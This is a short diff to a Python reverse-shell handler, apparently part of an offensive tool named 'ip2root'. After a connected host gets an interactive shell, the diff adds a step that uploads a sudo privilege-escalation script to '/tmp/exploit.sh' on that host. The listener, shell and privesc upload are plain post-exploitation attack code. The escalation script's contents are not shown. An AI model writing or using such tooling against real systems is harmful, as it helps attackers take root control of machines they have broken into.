@@ -19,6 +19,9 @@ def main(port, interface):
         sock = Socket(port, interface)
         sock.listen(hosts)
         shell = Shell(sock, persistent)
+        print('[+] Uploading privesc script')
+        shell.sock.upload('/home/blank/ip2root/plugins/privesc/plugin_privesc_sudo.sh', '/tmp/exploit.sh')
+        #sock.send(bytes('id'))
         shell.interact()
         sock.close()
     except KeyboardInterrupt:
